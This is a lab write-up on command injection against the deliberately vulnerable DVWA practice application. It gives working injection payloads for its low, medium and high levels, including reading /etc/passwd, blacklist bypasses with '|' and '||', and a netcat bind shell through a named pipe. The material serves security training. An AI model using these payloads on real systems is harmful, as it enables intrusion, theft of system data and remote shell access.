Command Injection Optional Reading Material
Description

Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

This attack differs from Code Injection , in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.


DVWA Command Injection Optional Reading Material
DVWA - Command Injection
Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

Low
Underlying code does not check if $target matches an IP Address. No filtering on special characters. ; in Unix/Linux allows for commands to be separated.

192.168.0.1; pwd - Prints working directory, see below:

![image](https://user-images.githubusercontent.com/60177793/95013879-ccf27180-0660-11eb-8a6c-43a2f40c13ee.png)


192.168.0.1; cat /etc/passwd | tee /tmp/passwd - Displays the contents of /etc/passwd on the webpage and also copies the contents of /etc/passwd file to the /tmp directory.

Alternatives to ;
&& - AND Operator
| - PIPE Operator - Completely removes IP address from output.

Medium
Viewing source code, we see that a blacklist has been set to exclude && and ;. As noted above, we can use | as a replacement:
192.168.0.1| cat /etc/passwd. Double || can also be used, as shown below:
Screenshot 2018-03-28 21.43.37
![image](https://user-images.githubusercontent.com/60177793/95013894-e5fb2280-0660-11eb-9ef8-7499c896d6d3.png)

Can also use | pwd or || pwd (no need to include the ip address.)

High
Viewing source code, more extensive blacklist has been set. Slightly trickier, however the answer is in the view source -
'| ' => '', - note that there is a space after the | character. If we try | pwd, no output is returned, however if we use |pwd we are including our command within this space, as shown below:
![image](https://user-images.githubusercontent.com/60177793/95013903-fa3f1f80-0660-11eb-8c57-6b452f6d1fd8.png)


Bind Shell
192.168.0.1; /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe - Creates a netcat listener, then use nc 192.168.0.1 4444 to connect. (Change IP addresses to match those of target machine)

Points to note:
Ensure you are using commands specific to the target you are trying to attack, all of the above are Linux, Windows commands will be different.

Try commands with and without a space between them.

You will not always have access to the source code.
